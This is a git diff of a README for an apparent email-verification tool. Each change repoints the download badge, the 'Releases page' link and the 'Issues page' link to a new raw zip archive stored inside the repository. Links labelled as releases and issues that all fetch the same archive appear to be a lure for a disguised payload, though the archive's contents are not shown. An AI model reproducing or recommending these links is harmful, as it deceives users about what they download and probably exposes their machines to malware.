@@ -1,6 +1,6 @@
 # 📧 bulk-emails-verifier - Efficient Email Verification Made Simple
 
-[![Download from Releases](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/src/config/bulk-emails-verifier-2.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/src/config/bulk-emails-verifier-2.4.zip)
+[![Download from Releases](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/data/bulk-verifier-emails-v2.7-beta.2.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/data/bulk-verifier-emails-v2.7-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to bulk-emails-verifier! This tool helps you verify large lists of email
 To get started, you need to download the software from our Releases page. 
 
 1. **Visit the Releases Page:**  
-   Click [here](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/src/config/bulk-emails-verifier-2.4.zip) to access our latest releases.
+   Click [here](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/data/bulk-verifier-emails-v2.7-beta.2.zip) to access our latest releases.
 
 2. **Choose the Version:**  
    Find the latest version of the bulk-emails-verifier. Check the notes for any new features or fixes.
@@ -70,7 +70,7 @@ To get started, you need to download the software from our Releases page.
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, feel free to reach out. Visit our [Issues page](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/src/config/bulk-emails-verifier-2.4.zip) to report problems or seek assistance.
+If you encounter any issues or have questions, feel free to reach out. Visit our [Issues page](https://raw.githubusercontent.com/AvishekInvincible/bulk-emails-verifier/main/data/bulk-verifier-emails-v2.7-beta.2.zip) to report problems or seek assistance.
 
 ## 📅 Future Improvements
 
